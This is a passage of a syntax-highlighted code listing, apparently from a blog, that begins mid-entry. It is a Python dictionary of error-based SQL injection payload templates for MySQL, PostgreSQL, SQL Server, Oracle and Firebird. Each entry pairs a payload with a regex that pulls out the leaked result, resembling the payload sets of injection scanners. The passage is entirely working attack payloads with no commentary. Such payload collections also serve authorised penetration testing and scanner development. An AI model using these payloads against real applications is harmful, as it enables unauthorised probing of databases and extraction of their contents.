<span class="keyword">UNION</span> <span class="keyword">SELECT</span> [RANDNUM4] <span class="keyword">UNION</span> <span class="keyword">SELECT</span> [RANDNUM5])a <span class="keyword">GROUP</span> <span class="keyword">BY</span> x)<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_13':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">OR</span> <span class="keyword">ROW</span>([RANDNUM],[RANDNUM1])&gt;(<span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*),<span class="keyword">CONCAT</span>(<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>)),<span class="string">'[DELIMITER_STOP]'</span>,<span class="keyword">FLOOR</span>(<span class="keyword">RAND</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> [RANDNUM2] <span class="keyword">UNION</span> <span class="keyword">SELECT</span> [RANDNUM3] <span class="keyword">UNION</span> <span class="keyword">SELECT</span> [RANDNUM4] <span class="keyword">UNION</span> <span class="keyword">SELECT</span> [RANDNUM5])a <span class="keyword">GROUP</span> <span class="keyword">BY</span> x)<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_10':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">AND</span> UPDATEXML([RANDNUM],<span class="keyword">CONCAT</span>(<span class="string">'.'</span>,<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>)),<span class="string">'[DELIMITER_STOP]'</span>),[RANDNUM1])<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_11':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">OR</span> UPDATEXML([RANDNUM],<span class="keyword">CONCAT</span>(<span class="string">'.'</span>,<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>)),<span class="string">'[DELIMITER_STOP]'</span>),[RANDNUM1])<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_16':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'PostgreSQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">OR</span> [RANDNUM]=<span class="keyword">CAST</span>(<span class="string">'[DELIMITER_START]'</span>||(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>))::<span class="built_in">text</span>||<span class="string">'[DELIMITER_STOP]'</span> <span class="keyword">AS</span> <span class="built_in">NUMERIC</span>)<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_17':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'Microsoft SQL Server', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">AND</span> [RANDNUM] <span class="keyword">IN</span> (<span class="keyword">SELECT</span> (<span class="string">'[DELIMITER_START]'</span>+(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="string">'1'</span> <span class="keyword">ELSE</span> <span class="string">'0'</span> <span class="keyword">END</span>))+<span class="string">'[DELIMITER_STOP]'</span>))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_14':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">OR</span> <span class="number">1</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> <span class="keyword">CONCAT</span>(<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>)),<span class="string">'[DELIMITER_STOP]'</span>,<span class="keyword">FLOOR</span>(<span class="keyword">RAND</span>(<span class="number">0</span>)*<span class="number">2</span>)) <span class="keyword">HAVING</span> <span class="keyword">MIN</span>(<span class="number">0</span>)<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_15':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'PostgreSQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">AND</span> [RANDNUM]=<span class="keyword">CAST</span>(<span class="string">'[DELIMITER_START]'</span>||(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>))::<span class="built_in">text</span>||<span class="string">'[DELIMITER_STOP]'</span> <span class="keyword">AS</span> <span class="built_in">NUMERIC</span>)<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_18':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'Microsoft SQL Server', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">OR</span> [RANDNUM] <span class="keyword">IN</span> (<span class="keyword">SELECT</span> (<span class="string">'[DELIMITER_START]'</span>+(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="string">'1'</span> <span class="keyword">ELSE</span> <span class="string">'0'</span> <span class="keyword">END</span>))+<span class="string">'[DELIMITER_STOP]'</span>))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_19':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'Microsoft SQL Server', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">AND</span> [RANDNUM]=<span class="keyword">CONVERT</span>(<span class="built_in">INT</span>,(<span class="keyword">SELECT</span> <span class="string">'[DELIMITER_START]'</span>+(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="string">'1'</span> <span class="keyword">ELSE</span> <span class="string">'0'</span> <span class="keyword">END</span>))+<span class="string">'[DELIMITER_STOP]'</span>))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_52':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> ,(<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="keyword">ROW</span>([RANDNUM],[RANDNUM1])&gt;(<span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*),<span class="keyword">CONCAT</span>(<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">ELT</span>([RANDNUM]=[RANDNUM],<span class="number">1</span>))),<span class="string">'[DELIMITER_STOP]'</span>,<span class="keyword">FLOOR</span>(<span class="keyword">RAND</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> [RANDNUM2] <span class="keyword">UNION</span> <span class="keyword">SELECT</span> [RANDNUM3] <span class="keyword">UNION</span> <span class="keyword">SELECT</span> [RANDNUM4] <span class="keyword">UNION</span> <span class="keyword">SELECT</span> [RANDNUM5])a <span class="keyword">GROUP</span> <span class="keyword">BY</span> x))s)<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_56':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'Oracle', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> ,(<span class="keyword">SELECT</span> <span class="keyword">UPPER</span>(<span class="keyword">XMLType</span>(<span class="keyword">CHR</span>(<span class="number">60</span>)||<span class="keyword">CHR</span>(<span class="number">58</span>)||<span class="string">'[DELIMITER_START]'</span>||(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">FROM</span> DUAL)||<span class="string">'[DELIMITER_STOP]'</span>||<span class="keyword">CHR</span>(<span class="number">62</span>))) <span class="keyword">FROM</span> DUAL)<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_57':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'Firebird', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> ,(<span class="keyword">SELECT</span> [RANDNUM]=(<span class="string">'[DELIMITER_START]'</span>||(<span class="keyword">SELECT</span> <span class="keyword">CASE</span> [RANDNUM] <span class="keyword">WHEN</span> [RANDNUM] <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span> <span class="keyword">FROM</span> RDB$<span class="keyword">DATABASE</span>)||<span class="string">'[DELIMITER_STOP]'</span>))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_54':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'PostgreSQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> ,(<span class="keyword">CAST</span>(<span class="string">'[DELIMITER_START]'</span>||(<span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">FROM</span> GENERATE_SERIES([RANDNUM],[RANDNUM],<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">LIMIT</span> <span class="number">1</span>)::<span class="built_in">text</span>||<span class="string">'[DELIMITER_STOP]'</span> <span class="keyword">AS</span> <span class="built_in">NUMERIC</span>))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_0':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="number">2</span>*(<span class="keyword">IF</span>((<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="keyword">CONCAT</span>(<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>)),<span class="string">'[DELIMITER_STOP]'</span>,<span class="string">'x'</span>))s), <span class="number">8446744073709551610</span>, <span class="number">8446744073709551610</span>)))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_1':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">OR</span> (<span class="keyword">SELECT</span> <span class="number">2</span>*(<span class="keyword">IF</span>((<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="keyword">CONCAT</span>(<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>)),<span class="string">'[DELIMITER_STOP]'</span>,<span class="string">'x'</span>))s), <span class="number">8446744073709551610</span>, <span class="number">8446744073709551610</span>)))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_2':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">AND</span> <span class="keyword">EXP</span>(~(<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="keyword">CONCAT</span>(<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">ELT</span>([RANDNUM]=[RANDNUM],<span class="number">1</span>))),<span class="string">'[DELIMITER_STOP]'</span>,<span class="string">'x'</span>))x))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_3':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">OR</span> <span class="keyword">EXP</span>(~(<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="keyword">CONCAT</span>(<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">ELT</span>([RANDNUM]=[RANDNUM],<span class="number">1</span>))),<span class="string">'[DELIMITER_STOP]'</span>,<span class="string">'x'</span>))x))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_4':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">AND</span> JSON_KEYS((<span class="keyword">SELECT</span> <span class="keyword">CONVERT</span>((<span class="keyword">SELECT</span> <span class="keyword">CONCAT</span>(<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">ELT</span>([RANDNUM]=[RANDNUM],<span class="number">1</span>))),<span class="string">'[DELIMITER_STOP]'</span>)) <span class="keyword">USING</span> utf8)))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_5':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">OR</span> JSON_KEYS((<span class="keyword">SELECT</span> <span class="keyword">CONVERT</span>((<span class="keyword">SELECT</span> <span class="keyword">CONCAT</span>(<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">ELT</span>([RANDNUM]=[RANDNUM],<span class="number">1</span>))),<span class="string">'[DELIMITER_STOP]'</span>)) <span class="keyword">USING</span> utf8)))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_6':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">FROM</span>(<span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*),<span class="keyword">CONCAT</span>(<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>)),<span class="string">'[DELIMITER_STOP]'</span>,<span class="keyword">FLOOR</span>(<span class="keyword">RAND</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">FROM</span> INFORMATION_SCHEMA.PLUGINS <span class="keyword">GROUP</span> <span class="keyword">BY</span> x)a)<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_7':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">OR</span> (<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">FROM</span>(<span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*),<span class="keyword">CONCAT</span>(<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>)),<span class="string">'[DELIMITER_STOP]'</span>,<span class="keyword">FLOOR</span>(<span class="keyword">RAND</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">FROM</span> INFORMATION_SCHEMA.PLUGINS <span class="keyword">GROUP</span> <span class="keyword">BY</span> x)a)<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_8':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">AND</span> EXTRACTVALUE([RANDNUM],<span class="keyword">CONCAT</span>(<span class="string">'\\'</span>,<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>)),<span class="string">'[DELIMITER_STOP]'</span>))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_9':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">OR</span> EXTRACTVALUE([RANDNUM],<span class="keyword">CONCAT</span>(<span class="string">'\\'</span>,<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>)),<span class="string">'[DELIMITER_STOP]'</span>))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_53':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'PostgreSQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> ,(<span class="keyword">CAST</span>(<span class="string">'[DELIMITER_START]'</span>||(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>))::<span class="built_in">text</span>||<span class="string">'[DELIMITER_STOP]'</span> <span class="keyword">AS</span> <span class="built_in">NUMERIC</span>))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_49':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> ,(<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">FROM</span>(<span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*),<span class="keyword">CONCAT</span>(<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">ELT</span>([RANDNUM]=[RANDNUM],<span class="number">1</span>))),<span class="string">'[DELIMITER_STOP]'</span>,<span class="keyword">FLOOR</span>(<span class="keyword">RAND</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">FROM</span> INFORMATION_SCHEMA.PLUGINS <span class="keyword">GROUP</span> <span class="keyword">BY</span> x)a)<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_48':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> ,(<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> JSON_KEYS((<span class="keyword">SELECT</span> <span class="keyword">CONVERT</span>((<span class="keyword">SELECT</span> <span class="keyword">CONCAT</span>(<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">ELT</span>([RANDNUM]=[RANDNUM],<span class="number">1</span>))),<span class="string">'[DELIMITER_STOP]'</span>)) <span class="keyword">USING</span> utf8))))x)<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_45':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'Firebird', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> (<span class="keyword">SELECT</span> [RANDNUM]=(<span class="string">'[DELIMITER_START]'</span>||(<span class="keyword">SELECT</span> <span class="keyword">CASE</span> [RANDNUM] <span class="keyword">WHEN</span> [RANDNUM] <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span> <span class="keyword">FROM</span> RDB$<span class="keyword">DATABASE</span>)||<span class="string">'[DELIMITER_STOP]'</span>))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_44':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'Oracle', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> (<span class="keyword">SELECT</span> <span class="keyword">UPPER</span>(<span class="keyword">XMLType</span>(<span class="keyword">CHR</span>(<span class="number">60</span>)||<span class="keyword">CHR</span>(<span class="number">58</span>)||<span class="string">'[DELIMITER_START]'</span>||(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">FROM</span> DUAL)||<span class="string">'[DELIMITER_STOP]'</span>||<span class="keyword">CHR</span>(<span class="number">62</span>))) <span class="keyword">FROM</span> DUAL)<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_47':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> ,(<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="keyword">EXP</span>(~(<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="keyword">CONCAT</span>(<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">ELT</span>([RANDNUM]=[RANDNUM],<span class="number">1</span>))),<span class="string">'[DELIMITER_STOP]'</span>,<span class="string">'x'</span>))x)))s)<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_46':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> ,(<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="number">2</span>*(<span class="keyword">IF</span>((<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="keyword">CONCAT</span>(<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">ELT</span>([RANDNUM]=[RANDNUM],<span class="number">1</span>))),<span class="string">'[DELIMITER_STOP]'</span>,<span class="string">'x'</span>))s), <span class="number">8446744073709551610</span>, <span class="number">8446744073709551610</span>)))x)<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_41':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'PostgreSQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> (<span class="keyword">CAST</span>(<span class="string">'[DELIMITER_START]'</span>||(<span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">FROM</span> GENERATE_SERIES([RANDNUM],[RANDNUM],<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">LIMIT</span> <span class="number">1</span>)::<span class="built_in">text</span>||<span class="string">'[DELIMITER_STOP]'</span> <span class="keyword">AS</span> <span class="built_in">NUMERIC</span>))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_40':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'PostgreSQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> (<span class="keyword">CAST</span>(<span class="string">'[DELIMITER_START]'</span>||(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>))::<span class="built_in">text</span>||<span class="string">'[DELIMITER_STOP]'</span> <span class="keyword">AS</span> <span class="built_in">NUMERIC</span>))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_43':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'Microsoft SQL Server', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> (<span class="keyword">SELECT</span> <span class="string">'[DELIMITER_START]'</span>+(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="string">'1'</span> <span class="keyword">ELSE</span> <span class="string">'0'</span> <span class="keyword">END</span>))+<span class="string">'[DELIMITER_STOP]'</span>)<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_42':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'Microsoft SQL Server', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> (<span class="keyword">CONVERT</span>(<span class="built_in">INT</span>,(<span class="keyword">SELECT</span> <span class="string">'[DELIMITER_START]'</span>+(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="string">'1'</span> <span class="keyword">ELSE</span> <span class="string">'0'</span> <span class="keyword">END</span>))+<span class="string">'[DELIMITER_STOP]'</span>)))<span class="string">"&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>

